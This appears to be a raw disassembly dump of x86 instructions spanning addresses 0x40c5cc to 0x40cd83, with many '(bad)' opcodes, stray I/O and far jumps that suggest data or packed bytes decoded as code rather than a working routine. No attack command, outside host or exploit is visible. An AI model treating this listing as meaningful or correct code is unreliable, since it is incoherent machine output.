  40c5cc:	push   ebp
  40c5cd:	mov    ss,WORD PTR [eax+0x36ebb106]
  40c5d3:	mov    esp,0xa1824f3e
  40c5d8:	loop   0x40c582
  40c5da:	in     al,0x7b
  40c5dc:	fdivr  DWORD PTR [eax-0x28caf1e2]
  40c5e2:	enter  0x847,0xf1
  40c5e6:	es cmp al,0x8
  40c5e9:	mov    eax,ds:0x59adec58
  40c5ee:	stos   BYTE PTR es:[edi],al
  40c5ef:	call   0x6325fc72
  40c5f4:	(bad)  
  40c5f5:	push   edi
  40c5f6:	add    eax,0x7419ef26
  40c5fb:	test   edi,0x7a129f5
  40c601:	xchg   edi,eax
  40c602:	lods   al,BYTE PTR ds:[esi]
  40c603:	pop    ecx
  40c604:	pop    edi
  40c605:	fld    QWORD PTR [esi-0x47af631e]
  40c60b:	out    dx,eax
  40c60c:	dec    edi
  40c60d:	leave  
  40c60e:	push   ss
  40c60f:	mov    edi,0xa00df8d4
  40c614:	imul   eax,DWORD PTR [edx-0x7d],0xffffffde
  40c618:	enter  0xbea1,0x18
  40c61c:	sub    al,0xde
  40c61e:	jp     0x40c5da
  40c620:	out    dx,eax
  40c621:	cs test al,0x8e
  40c624:	retf   
  40c625:	jo     0x40c675
  40c627:	jbe    0x40c636
  40c629:	pushf  
  40c62a:	and    ebx,edx
  40c62c:	sar    BYTE PTR [ebp-0x332b51e3],cl
  40c632:	inc    ebp
  40c633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c634:	gs dec eax
  40c636:	xor    eax,0x7e26b8c2
  40c63b:	scas   eax,DWORD PTR es:[edi]
  40c63c:	xchg   edi,eax
  40c63d:	push   0x7d
  40c63f:	push   ds
  40c640:	mov    ch,0xb5
  40c642:	sub    BYTE PTR [edx+ecx*1+0x590e522f],bh
  40c649:	sub    al,0x4c
  40c64b:	fadd   st(0),st
  40c64d:	ror    DWORD PTR [esi],0x14
  40c650:	jo     0x40c6c7
  40c652:	sbb    al,al
  40c654:	leave  
  40c655:	iret   
  40c656:	or     dh,BYTE PTR [edx+0x79]
  40c659:	jb     0x40c6c4
  40c65b:	sahf   
  40c65c:	scas   eax,DWORD PTR es:[edi]
  40c65d:	(bad)  
  40c65e:	dec    ebp
  40c65f:	sub    DWORD PTR [edi+0x628f9cff],ebp
  40c665:	xor    al,0xac
  40c667:	push   esi
  40c668:	daa    
  40c669:	adc    edi,DWORD PTR [eax+eiz*1-0x41]
  40c66d:	rcl    BYTE PTR [eax+0x64],cl
  40c670:	mov    DWORD PTR [eax-0x44],eax
  40c673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c674:	in     eax,0xe8
  40c676:	adc    eax,0x7a0f03d
  40c67b:	outs   dx,BYTE PTR ds:[esi]
  40c67c:	and    ebp,DWORD PTR [esi-0x452a2a98]
  40c682:	xor    ch,BYTE PTR [esi-0x1f]
  40c685:	scas   eax,DWORD PTR es:[edi]
  40c686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c687:	adc    al,0xd0
  40c689:	stos   DWORD PTR es:[edi],eax
  40c68a:	loope  0x40c68b
  40c68c:	mov    bl,al
  40c68e:	dec    ecx
  40c68f:	mov    dh,0x12
  40c691:	out    dx,eax
  40c692:	add    cl,BYTE PTR [ecx+0x7eb88df]
  40c698:	pop    esp
  40c699:	hlt    
  40c69a:	add    ebx,0x7c5cea39
  40c6a0:	sbb    DWORD PTR [ecx+ebx*1+0x7d],eax
  40c6a4:	or     eax,0x3bbbdea7
  40c6a9:	repnz rol DWORD PTR [ebx],0x2b
  40c6ad:	jp     0x40c6a1
  40c6af:	pop    esi
  40c6b0:	inc    edx
  40c6b1:	daa    
  40c6b2:	or     BYTE PTR [edx],0xea
  40c6b5:	fcomp  st(5)
  40c6b7:	jne    0x40c68c
  40c6b9:	inc    ebx
  40c6ba:	div    DWORD PTR [esi+ecx*8-0x3c]
  40c6be:	xor    dl,BYTE PTR [ebp+eax*1+0x1a]
  40c6c2:	adc    eax,0x9119e4f7
  40c6c7:	leave  
  40c6c8:	cmp    ah,BYTE PTR [ebp-0xd]
  40c6cb:	sub    al,0xe
  40c6cd:	and    edi,DWORD PTR [ebx+0x9be4758]
  40c6d3:	lods   al,BYTE PTR ds:[esi]
  40c6d4:	push   ds
  40c6d5:	retf   
  40c6d6:	fnstsw WORD PTR [ebx]
  40c6d8:	mov    esi,0x6a820e9f
  40c6dd:	adc    al,0xb2
  40c6df:	push   ecx
  40c6e0:	fnstsw WORD PTR [esi+eax*1+0x378d3b15]
  40c6e7:	pop    edi
  40c6e8:	aas    
  40c6e9:	pop    esi
  40c6ea:	jle    0x40c74a
  40c6ec:	cmp    esi,DWORD PTR [esi-0x77aec23b]
  40c6f2:	mov    esp,0xb1d10c40
  40c6f7:	dec    ebx
  40c6f8:	mov    ds:0x662dc3b,al
  40c6fd:	lock inc ebp
  40c6ff:	inc    ebp
  40c700:	xor    DWORD PTR [edi],esi
  40c702:	push   esi
  40c703:	stos   DWORD PTR es:[edi],eax
  40c704:	jg     0x40c76e
  40c706:	mov    dh,0x79
  40c708:	out    dx,eax
  40c709:	dec    esi
  40c70a:	sub    DWORD PTR [esi+0x6f],eax
  40c70d:	push   edi
  40c70e:	jno    0x40c6ec
  40c710:	cdq    
  40c711:	ins    DWORD PTR es:[edi],dx
  40c712:	call   0xcef6a95a
  40c717:	dec    esp
  40c718:	push   es
  40c719:	and    DWORD PTR [ecx],edi
  40c71b:	push   edi
  40c71c:	shl    DWORD PTR [edi+0x576e25d],cl
  40c722:	xor    eax,0xcb3869ca
  40c727:	ret    
  40c728:	adc    ch,bh
  40c72a:	or     al,BYTE PTR [ebx+ecx*8+0x57bf8ffe]
  40c731:	aam    0xc4
  40c733:	cli    
  40c734:	sbb    BYTE PTR [ecx+0x1],0xb9
  40c738:	or     DWORD PTR ds:0x3c3a0f6b,0xffffffe9
  40c73f:	mov    ebx,0x903a9f95
  40c744:	mov    ecx,0x5f5d57d2
  40c749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74a:	mov    bh,0x54
  40c74c:	and    eax,DWORD PTR [ebp+0x1fcea4c2]
  40c752:	and    al,0xfd
  40c754:	push   ds
  40c755:	xor    ebx,DWORD PTR [edi]
  40c757:	mov    ds:0xdada3d96,al
  40c75c:	add    al,0x56
  40c75e:	into   
  40c75f:	retf   0x6cb6
  40c762:	inc    ebx
  40c763:	cdq    
  40c764:	in     eax,dx
  40c765:	dec    ecx
  40c766:	xor    esp,DWORD PTR [ebx+ecx*2-0x7771294d]
  40c76d:	test   DWORD PTR [esi-0x5bcdf404],ecx
  40c773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c774:	xchg   edx,eax
  40c775:	xchg   ebp,eax
  40c776:	mov    ch,0xa9
  40c778:	lock add BYTE PTR [ecx-0x4c658e66],bl
  40c77f:	sub    ch,BYTE PTR [eax]
  40c781:	adc    al,0xc2
  40c783:	mov    dl,0xdf
  40c785:	das    
  40c786:	sbb    dh,BYTE PTR [ebp-0x7bcc4eb6]
  40c78c:	jbe    0x40c779
  40c78e:	push   edi
  40c78f:	sub    ecx,DWORD PTR [ecx+0x5e]
  40c792:	add    al,0x99
  40c794:	je     0x40c7c7
  40c796:	pushf  
  40c797:	outs   dx,BYTE PTR ds:[esi]
  40c798:	das    
  40c799:	ror    BYTE PTR [eax+0x64],0x5b
  40c79d:	sbb    BYTE PTR [edi],dl
  40c79f:	leave  
  40c7a0:	out    dx,al
  40c7a1:	cmc    
  40c7a2:	or     eax,0x6990205c
  40c7a7:	ins    BYTE PTR es:[edi],dx
  40c7a8:	dec    ebx
  40c7a9:	mov    edx,0x7836ce32
  40c7ae:	jnp    0x40c7a0
  40c7b0:	xchg   ebp,eax
  40c7b1:	xchg   esi,eax
  40c7b2:	mov    al,0xa0
  40c7b5:	add    DWORD PTR [ebp+0x4f],0x33
  40c7b9:	out    0x70,eax
  40c7bb:	cli    
  40c7bc:	aas    
  40c7bd:	ja     0x40c807
  40c7bf:	(bad)  
  40c7c0:	jp     0x40c7ff
  40c7c2:	loop   0x40c7e8
  40c7c4:	mov    bl,0x60
  40c7c6:	arpl   WORD PTR [ebx],di
  40c7c8:	xchg   ebp,eax
  40c7c9:	nop
  40c7ca:	scas   al,BYTE PTR es:[edi]
  40c7cb:	(bad)  
  40c7cc:	jmp    0x3e39:0x1951ca46
  40c7d3:	fdiv   QWORD PTR [edx-0x16]
  40c7d6:	push   ds
  40c7d7:	bound  esp,QWORD PTR [esi+0x2b6ef5e1]
  40c7dd:	mov    esp,0xc1390660
  40c7e2:	mov    dh,0x8a
  40c7e4:	sub    dl,BYTE PTR [edx-0x7ec99cb0]
  40c7ea:	push   ss
  40c7eb:	push   0xcb43ef1e
  40c7f0:	fwait
  40c7f1:	(bad)
  40c7f4:	pop    edx
  40c7f5:	sti    
  40c7f6:	inc    ebp
  40c7f7:	sub    cl,ch
  40c7f9:	addr16 pop es
  40c7fb:	jmp    0x410e:0x1a648e30
  40c802:	add    al,0x72
  40c804:	mov    edi,0x676eb43e
  40c809:	or     dl,BYTE PTR [esi-0x55]
  40c80c:	dec    ebx
  40c80d:	lock sar DWORD PTR [esi+0x55243059],1
  40c814:	or     DWORD PTR [ebx+0x0],0x3b
  40c818:	les    eax,FWORD PTR [esi]
  40c81a:	loope  0x40c80e
  40c81c:	xchg   esi,eax
  40c81d:	retf   0xc162
  40c820:	pop    ecx
  40c821:	xchg   ebp,eax
  40c822:	cmp    ebx,DWORD PTR [edx+0xe]
  40c825:	sub    DWORD PTR [ebp-0x46],esi
  40c828:	or     ah,BYTE PTR [edi+eax*2-0x2975409c]
  40c82f:	mov    dl,0xab
  40c831:	adc    eax,0x3e03fec5
  40c836:	push   ss
  40c837:	jae    0x40c8b3
  40c839:	ins    DWORD PTR es:[edi],dx
  40c83a:	adc    dl,BYTE PTR [edi+0x41660ce8]
  40c840:	lahf   
  40c841:	sbb    ah,bl
  40c843:	adc    esi,DWORD PTR [edi+ecx*8-0x330b12f]
  40c84a:	xchg   ebp,eax
  40c84b:	inc    ebx
  40c84c:	rcr    bl,1
  40c84e:	and    DWORD PTR [esp+ebx*4+0x6d],esi
  40c852:	in     eax,dx
  40c853:	aas    
  40c854:	nop
  40c855:	sub    dh,0x2c
  40c858:	enter  0xf91e,0xfa
  40c85c:	popa   
  40c85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c85e:	loopne 0x40c8cf
  40c860:	xchg   DWORD PTR [ecx-0x511c648],ebp
  40c866:	pop    esp
  40c867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c868:	outs   dx,DWORD PTR ds:[esi]
  40c869:	push   eax
  40c86a:	rcl    BYTE PTR [edx],1
  40c86c:	adc    eax,0xeb85bfb7
  40c871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c872:	adc    edx,ebp
  40c874:	jno    0x40c872
  40c876:	data16 sbb BYTE PTR [ecx+eiz*4-0x340bba10],ah
  40c87e:	ffreep st(4)
  40c880:	call   0x36e38dcc
  40c885:	or     BYTE PTR [ebx-0x40],dl
  40c888:	mov    al,0x63
  40c88a:	mov    ebx,0xb2b8b6b8
  40c88f:	jne    0x40c836
  40c891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c892:	pop    esi
  40c893:	int    0x49
  40c895:	cmp    eax,0xac550742
  40c89a:	retf   
  40c89b:	ds std 
  40c89d:	inc    edx
  40c89e:	fpatan 
  40c8a0:	adc    eax,0xe78af62b
  40c8a5:	loope  0x40c91f
  40c8a7:	lock loop 0x40c82d
  40c8aa:	sub    ecx,DWORD PTR [ecx]
  40c8ac:	inc    edi
  40c8ad:	lods   eax,DWORD PTR ds:[esi]
  40c8ae:	and    edi,DWORD PTR [edx]
  40c8b0:	pop    ds
  40c8b1:	jnp    0x40c896
  40c8b3:	cmp    DWORD PTR [eax-0x18],edx
  40c8b6:	mov    dh,0x90
  40c8b8:	(bad)  
  40c8b9:	fsub   DWORD PTR [ebx+0x67]
  40c8bc:	jge    0x40c891
  40c8be:	enter  0x73c1,0x80
  40c8c2:	ror    ebx,1
  40c8c4:	cmp    bh,BYTE PTR [ecx]
  40c8c6:	not    al
  40c8c8:	and    eax,0x25a64ab2
  40c8cd:	loop   0x40c869
  40c8cf:	xor    ah,dh
  40c8d1:	sub    ebx,DWORD PTR [eax-0x57]
  40c8d4:	mov    ah,0x4c
  40c8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8d7:	(bad)  
  40c8d8:	push   esi
  40c8d9:	jnp    0x40c921
  40c8db:	mov    eax,ds:0x5df57a2a
  40c8e0:	adc    cl,BYTE PTR [edi]
  40c8e2:	xor    ebp,edi
  40c8e4:	jmp    0x40c905
  40c8e6:	or     al,BYTE PTR [esi+0x4822bae]
  40c8ec:	cmp    eax,0x75546cb4
  40c8f1:	ins    DWORD PTR es:[edi],dx
  40c8f2:	pop    esi
  40c8f3:	dec    eax
  40c8f4:	test   eax,0x9564576d
  40c8f9:	add    dh,dl
  40c8fb:	pusha  
  40c8fc:	pop    edx
  40c8fd:	(bad)  
  40c8ff:	(bad)  
  40c900:	lods   al,BYTE PTR ds:[esi]
  40c901:	sbb    bl,BYTE PTR [esi+0x23828dcf]
  40c907:	aam    0xb6
  40c909:	aas    
  40c90a:	out    dx,eax
  40c90b:	and    eax,0x37d2c4a
  40c910:	cwde   
  40c911:	into   
  40c912:	imul   ax,WORD PTR [esi-0x7527e067],0x9d07
  40c91b:	(bad)  
  40c91c:	retf   
  40c91d:	or     ch,0xa
  40c920:	adc    DWORD PTR [edi],esp
  40c922:	test   BYTE PTR cs:[ebx],bh
  40c925:	sub    ecx,DWORD PTR [edi+edx*8]
  40c928:	stos   BYTE PTR es:[edi],al
  40c929:	cmc    
  40c92a:	sub    ebp,DWORD PTR [ebp+0x58]
  40c92d:	loop   0x40c8b6
  40c92f:	sbb    al,0x7d
  40c931:	cmc    
  40c932:	popa   
  40c933:	mov    bh,0x5c
  40c936:	les    eax,FWORD PTR [esi+0x56]
  40c939:	sbb    eax,0x71996453
  40c93e:	cli    
  40c93f:	xor    dl,ch
  40c941:	sbb    esi,esp
  40c943:	pop    edx
  40c944:	xor    BYTE PTR [edi+0x34],ah
  40c947:	retf   0xa360
  40c94a:	adc    al,0x57
  40c94c:	mov    ch,0xbe
  40c94e:	in     al,0x43
  40c950:	rcl    DWORD PTR [ebp+0x6384653e],cl
  40c956:	adc    BYTE PTR [ebx+0x55d5af25],ch
  40c95c:	cmp    DWORD PTR [edx-0x1389f7d9],edx
  40c962:	mov    dh,0xcb
  40c964:	dec    ecx
  40c965:	jge    0x40c9a3
  40c967:	dec    edi
  40c968:	js     0x40c992
  40c96a:	sar    DWORD PTR [edx],cl
  40c96c:	add    edx,DWORD PTR [edx+eax*1]
  40c96f:	gs jge 0x40c9e5
  40c972:	scas   eax,DWORD PTR es:[edi]
  40c973:	test   eax,0x4d997fe9
  40c978:	mov    ds:0x3a1930,al
  40c97d:	dec    esi
  40c97e:	in     al,dx
  40c97f:	jp     0x40c909
  40c981:	add    DWORD PTR [edi-0x8],esp
  40c984:	dec    edi
  40c985:	pop    esp
  40c986:	sub    eax,0xcb831444
  40c98b:	stos   DWORD PTR es:[edi],eax
  40c98c:	add    al,0x8b
  40c98e:	loopne 0x40c946
  40c990:	adc    al,0xa8
  40c992:	je     0x40c991
  40c994:	dec    edi
  40c995:	aad    0x4d
  40c997:	mov    edi,0x923fa653
  40c99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c99d:	repz xchg ebx,eax
  40c99f:	mov    cl,0x1e
  40c9a1:	mov    WORD PTR [esi],es
  40c9a3:	or     DWORD PTR [esi-0x55686fd1],0x52
  40c9aa:	push   cs
  40c9ab:	mov    edi,0x45ed097a
  40c9b0:	and    DWORD PTR [esi],ecx
  40c9b2:	lock xchg DWORD PTR [eax],ebp
  40c9b5:	add    al,BYTE PTR [ebp+0x5e]
  40c9b8:	lods   al,BYTE PTR ds:[esi]
  40c9b9:	in     eax,0xf7
  40c9bb:	fs dec eax
  40c9bd:	mov    WORD PTR [edi],ds
  40c9bf:	xchg   DWORD PTR [edi+0x434ee0af],esi
  40c9c5:	adc    esi,DWORD PTR [edi+0x7f564094]
  40c9cb:	mov    ecx,edx
  40c9cd:	scas   eax,DWORD PTR es:[edi]
  40c9ce:	aas    
  40c9cf:	mov    edi,0x530faf1f
  40c9d4:	aam    0xad
  40c9d6:	(bad)  
  40c9d7:	xor    edi,eax
  40c9d9:	jmp    0x40c997
  40c9db:	not    BYTE PTR [esi]
  40c9dd:	adc    al,0xc8
  40c9df:	out    0xc,eax
  40c9e1:	pop    ss
  40c9e2:	pop    ds
  40c9e3:	push   eax
  40c9e4:	fnsave [ebp-0x6ba8234f]
  40c9ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9eb:	aam    0x5d
  40c9ed:	sbb    eax,0xaaeabd03
  40c9f2:	mov    WORD PTR [ebp-0x70],?
  40c9f5:	daa    
  40c9f6:	push   0xc4a1fb1d
  40c9fb:	mov    ebp,0xba6e995d
  40ca00:	pop    ss
  40ca01:	addr16 int 0xf5
  40ca04:	jle    0x40c9bb
  40ca06:	lahf   
  40ca07:	scas   al,BYTE PTR es:[edi]
  40ca08:	in     eax,0xce
  40ca0a:	repnz sub al,0xb0
  40ca0d:	mov    ch,0x1d
  40ca0f:	imul   ecx,DWORD PTR [ebx-0x1be7c7ef],0x678b7a75
  40ca19:	add    ah,BYTE PTR [ebx-0x4111150d]
  40ca1f:	(bad)  [ebx-0x1d]
  40ca22:	out    0xd4,al
  40ca24:	ins    DWORD PTR es:[edi],dx
  40ca25:	mov    edx,fs
  40ca27:	test   eax,0x9b5a4191
  40ca2c:	cmc    
  40ca2d:	leave  
  40ca2e:	jecxz  0x40ca03
  40ca30:	cmp    al,0x2
  40ca32:	ret    0x9686
  40ca35:	push   eax
  40ca36:	cmp    DWORD PTR [ecx],ebp
  40ca38:	jle    0x40c9e4
  40ca3a:	test   al,0x90
  40ca3c:	cdq    
  40ca3d:	call   0x15a5:0xa6088fd2
  40ca44:	adc    BYTE PTR [ebp+0x379ec1cd],bh
  40ca4a:	test   DWORD PTR [ebx-0x38],0xfdd3650f
  40ca51:	xor    al,0xc0
  40ca53:	mov    ebp,0xa7750cd2
  40ca58:	and    eax,0x95865403
  40ca5d:	jmp    0x40ca0f
  40ca5f:	(bad)  
  40ca60:	and    DWORD PTR [edi],edx
  40ca62:	mov    ebx,0xe6b6d868
  40ca67:	fidivr DWORD PTR [ebx+0xd]
  40ca6a:	imul   ecx,DWORD PTR [edi-0x67023744],0xbe1b2827
  40ca74:	push   esi
  40ca75:	dec    ebx
  40ca76:	imul   eax,DWORD PTR [eax],0x46
  40ca79:	pop    esi
  40ca7a:	jg     0x40ca56
  40ca7c:	loope  0x40caba
  40ca7e:	add    bh,BYTE PTR [ecx+ecx*8]
  40ca81:	xchg   esi,eax
  40ca82:	idiv   DWORD PTR [edi]
  40ca84:	push   edx
  40ca85:	test   DWORD PTR [edx],ebp
  40ca87:	ins    BYTE PTR es:[edi],dx
  40ca88:	lahf   
  40ca89:	ins    BYTE PTR es:[edi],dx
  40ca8a:	dec    edx
  40ca8b:	fmul   QWORD PTR [eax+0x24]
  40ca8e:	popf   
  40ca8f:	lds    ecx,FWORD PTR [ebx+0x6e53f223]
  40ca95:	(bad)  
  40ca96:	je     0x40cad5
  40ca98:	xchg   esp,eax
  40ca99:	xchg   DWORD PTR [edi-0x40],ebp
  40ca9c:	pop    eax
  40ca9d:	add    cl,BYTE PTR ds:[eax]
  40caa0:	mov    al,ds:0x8377b474
  40caa5:	(bad)  
  40caa6:	mov    ebx,0xecb1de65
  40caab:	or     eax,0xe4022a36
  40cab0:	mov    WORD PTR [edx+edx*2-0x68786df8],es
  40cab7:	in     eax,dx
  40cab8:	push   ebp
  40cab9:	xchg   DWORD PTR [ecx-0x59],esp
  40cabc:	jmp    0x40cb33
  40cabe:	in     eax,dx
  40cabf:	and    eax,0x10cea162
  40cac4:	mov    ch,0xa8
  40cac6:	stos   DWORD PTR es:[edi],eax
  40cac7:	jge    0x40cb12
  40cac9:	aas    
  40caca:	xchg   ecx,eax
  40cacb:	dec    ebp
  40cacc:	lea    edx,[esi+0x25]
  40cacf:	add    al,0x47
  40cad1:	push   edx
  40cad2:	sbb    BYTE PTR [ecx+0x7d],cl
  40cad5:	sar    BYTE PTR [edx+0x39028c98],1
  40cadb:	retf   
  40cadc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cadd:	push   ebx
  40cade:	or     eax,0x4cac3954
  40cae3:	xchg   esi,eax
  40cae4:	dec    esp
  40cae5:	rol    DWORD PTR ds:0x71eaed3f,0x5f
  40caec:	inc    eax
  40caed:	in     eax,dx
  40caee:	inc    ebp
  40caef:	xor    edi,eax
  40caf1:	pop    esi
  40caf2:	cs adc eax,0x1db89b65
  40caf8:	popa   
  40caf9:	mov    ah,0xda
  40cafb:	jmp    0x40cb17
  40cafd:	add    dh,bh
  40caff:	cdq    
  40cb00:	or     ecx,DWORD PTR [esi-0x4b]
  40cb03:	mov    al,0xb1
  40cb05:	dec    BYTE PTR [esi+ebx*1-0x44469fb8]
  40cb0c:	mov    esp,0xf3270c56
  40cb11:	mov    ?,esi
  40cb13:	nop
  40cb14:	or     dh,BYTE PTR [eax]
  40cb16:	nop
  40cb17:	lds    eax,FWORD PTR [eax]
  40cb19:	jbe    0x40cb39
  40cb1b:	loope  0x40cb30
  40cb1d:	inc    ecx
  40cb1e:	inc    edi
  40cb1f:	jmp    0xba8c:0xd758a83c
  40cb26:	pop    ss
  40cb27:	mov    esi,0xf04b1af
  40cb2c:	shr    esp,1
  40cb2e:	cld    
  40cb2f:	push   esp
  40cb30:	xor    al,0x5b
  40cb32:	sub    bl,bl
  40cb34:	and    bl,BYTE PTR [ecx+0x146725f]
  40cb3a:	xchg   esp,eax
  40cb3b:	push   0xffffffd3
  40cb3d:	lock popa 
  40cb3f:	sub    bl,BYTE PTR [ebx-0x6]
  40cb42:	into   
  40cb43:	sbb    al,0xfc
  40cb45:	lock mov al,dh
  40cb48:	sub    edx,ecx
  40cb4a:	pop    esi
  40cb4b:	fwait
  40cb4c:	cmp    BYTE PTR [edx-0x20],0x37
  40cb50:	mov    dh,0x39
  40cb52:	jp     0x40cb69
  40cb54:	not    DWORD PTR [edi]
  40cb56:	sti    
  40cb57:	call   0x9e4b49c9
  40cb5c:	cmp    al,0x2b
  40cb5e:	fisttp WORD PTR [edi+0xd]
  40cb61:	pop    eax
  40cb62:	dec    esp
  40cb63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb64:	mov    eax,ds:0xb5e1e202
  40cb69:	inc    eax
  40cb6a:	(bad)  
  40cb6b:	nop
  40cb6c:	mov    bh,BYTE PTR [eax+0x416e1150]
  40cb72:	jns    0x40cb23
  40cb74:	push   edx
  40cb75:	xor    eax,0x229bbb8f
  40cb7a:	fsub   DWORD PTR [esi-0x2e]
  40cb7d:	test   eax,0x8767467d
  40cb82:	xchg   esp,eax
  40cb83:	scas   al,BYTE PTR es:[edi]
  40cb84:	fild   WORD PTR [edi]
  40cb86:	jge    0x40cbf7
  40cb88:	pop    es
  40cb89:	int    0x6c
  40cb8b:	cmp    dh,bh
  40cb8d:	call   0xc6c7f58c
  40cb92:	push   ebx
  40cb93:	out    dx,al
  40cb94:	es mov cl,0x69
  40cb97:	bound  eax,QWORD PTR [ebp-0x4]
  40cb9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb9b:	fld    TBYTE PTR [edx]
  40cb9d:	push   edx
  40cb9e:	adc    al,0xc4
  40cba0:	fwait
  40cba1:	mov    ds:0x43ecb2e7,al
  40cba6:	js     0x40cbc1
  40cba8:	dec    ecx
  40cba9:	popf   
  40cbaa:	cdq    
  40cbab:	pop    ebx
  40cbac:	shl    DWORD PTR [edi+0x3ce953c7],cl
  40cbb2:	add    bl,dl
  40cbb4:	adc    esi,ebx
  40cbb6:	sub    eax,0xa61b07e9
  40cbbb:	out    dx,al
  40cbbc:	cld    
  40cbbd:	rol    DWORD PTR [esi],cl
  40cbbf:	ins    DWORD PTR es:[edi],dx
  40cbc0:	mov    al,0x92
  40cbc2:	ja     0x40cb54
  40cbc4:	and    esi,DWORD PTR [edi-0xd]
  40cbc7:	clc    
  40cbc8:	cmp    BYTE PTR [edi+eax*4],ch
  40cbcb:	jbe    0x40cc4b
  40cbcd:	mov    DWORD PTR [bp+0x71],eax
  40cbd1:	xchg   esi,eax
  40cbd2:	mov    eax,edi
  40cbd4:	pop    ds
  40cbd5:	stos   DWORD PTR es:[edi],eax
  40cbd6:	push   es
  40cbd7:	out    dx,eax
  40cbd8:	cld    
  40cbd9:	clc    
  40cbda:	or     al,0xca
  40cbdc:	popf   
  40cbdd:	out    0x1d,eax
  40cbdf:	shr    DWORD PTR [edx+0x71979576],cl
  40cbe5:	and    esi,ecx
  40cbe7:	imul   edi,DWORD PTR [eax-0x1bc1a84a],0xcb0f7a5d
  40cbf1:	fisub  WORD PTR [esi-0x21]
  40cbf4:	stos   BYTE PTR es:[edi],al
  40cbf5:	inc    eax
  40cbf6:	add    al,0x37
  40cbf8:	sub    BYTE PTR [edx],al
  40cbfa:	cmp    WORD PTR [edx-0x43],si
  40cbfe:	sahf   
  40cbff:	lds    esp,FWORD PTR [edi+ebp*8+0x76]
  40cc03:	test   DWORD PTR [ebx-0x6e],esp
  40cc06:	add    eax,0x8ecb40c7
  40cc0b:	sbb    BYTE PTR [ecx],al
  40cc0d:	sti    
  40cc0e:	js     0x40cc42
  40cc10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc11:	mov    cl,0x6
  40cc13:	mov    ch,0xa7
  40cc15:	mov    DWORD PTR [edi+0x2fa64254],eax
  40cc1b:	outs   dx,DWORD PTR ds:[esi]
  40cc1c:	jo     0x40cbeb
  40cc1e:	retf   0xc814
  40cc21:	mov    ebp,?
  40cc23:	(bad)  
  40cc24:	fcomp  DWORD PTR [ebx]
  40cc26:	sahf   
  40cc27:	cmp    al,0xc8
  40cc29:	dec    ebx
  40cc2a:	xor    esi,eax
  40cc2c:	mov    eax,ds:0xee2949eb
  40cc31:	xor    bl,bl
  40cc33:	mov    bl,0xf2
  40cc35:	sahf   
  40cc36:	push   DWORD PTR [edi+0x13]
  40cc39:	add    eax,0x2cc062f2
  40cc3e:	popa   
  40cc3f:	or     al,0xd3
  40cc41:	adc    esp,edx
  40cc43:	push   ebx
  40cc44:	mov    ch,0x4f
  40cc46:	int    0x11
  40cc48:	out    0x29,eax
  40cc4a:	leave  
  40cc4b:	rol    DWORD PTR [ecx+0x7f7ae0f4],cl
  40cc51:	xchg   ebx,eax
  40cc52:	sbb    ebp,DWORD PTR fs:[edi+edx*8]
  40cc56:	jno    0x40ccca
  40cc58:	arpl   WORD PTR [edx-0x32ad260d],cx
  40cc5e:	and    al,0xdf
  40cc60:	inc    esi
  40cc61:	test   eax,0x6ae699c6
  40cc66:	xchg   edx,eax
  40cc67:	fdivp  st(3),st
  40cc69:	mov    dl,0xf8
  40cc6b:	cmc    
  40cc6c:	nop
  40cc6d:	loop   0x40ccee
  40cc6f:	xchg   edi,esp
  40cc71:	(bad)  
  40cc72:	sub    esp,DWORD PTR [esi+0x3c]
  40cc75:	sbb    DWORD PTR [eax+0x5ccbec13],edi
  40cc7b:	mov    al,0xea
  40cc7d:	cmp    BYTE PTR [esi],cl
  40cc7f:	jle    0x40cc0c
  40cc81:	or     BYTE PTR [ebp+0x23],al
  40cc84:	sub    esi,DWORD PTR [esi]
  40cc86:	push   0xfffffff3
  40cc88:	retf   
  40cc89:	and    esp,ecx
  40cc8b:	mov    BYTE PTR [edi+ecx*1+0x4309dceb],bh
  40cc92:	mov    dl,0xa7
  40cc94:	dec    ebp
  40cc95:	jmp    DWORD PTR [edx]
	...
  40cd13:	add    BYTE PTR ds:0xf69202c1,dh
  40cd19:	shl    DWORD PTR [ebp+0x29d829e7],cl
  40cd1f:	scas   eax,DWORD PTR es:[edi]
  40cd20:	imul   eax,eax,0xb
  40cd23:	fsubr  QWORD PTR [edx+0x7c]
  40cd26:	add    BYTE PTR [eax],al
  40cd28:	imul   eax,DWORD PTR [edi],0x0
  40cd2b:	add    BYTE PTR [edi],cl
  40cd2d:	and    al,0xdd
  40cd2f:	repz and al,0xbe
  40cd32:	cmp    BYTE PTR [ebp+ebp*1-0x13],bl
  40cd36:	sub    dh,BYTE PTR ds:0x90cc395
  40cd3c:	in     eax,0xe0
  40cd3e:	or     BYTE PTR [edi+0x11],bh
  40cd41:	adc    esi,DWORD PTR [edi]
  40cd43:	into   
  40cd44:	in     al,0xb
  40cd46:	or     al,0x60
  40cd48:	fdivr  QWORD PTR [edx-0x3d6a28fe]
  40cd4e:	xchg   ebp,eax
  40cd4f:	clc    
  40cd50:	inc    eax
  40cd51:	sub    al,0x1f
  40cd53:	mov    ecx,0x51b029f3
  40cd58:	(bad)  
  40cd5a:	(bad)  
  40cd5b:	les    esp,FWORD PTR [esi+0x5b2dbafe]
  40cd61:	ins    BYTE PTR es:[edi],dx
  40cd62:	dec    eax
  40cd63:	mov    bh,0xa5
  40cd65:	or     ebp,DWORD PTR ds:0xbe4818ed
  40cd6b:	(bad)  
  40cd6d:	popa   
  40cd6e:	add    BYTE PTR ds:0x53d59bf2,ch
  40cd74:	(bad)  
  40cd75:	test   BYTE PTR [edx+0x6042172d],0xf5
  40cd7c:	cmp    eax,0xa081a0b
  40cd81:	(bad)  
  40cd83:	pop    bp
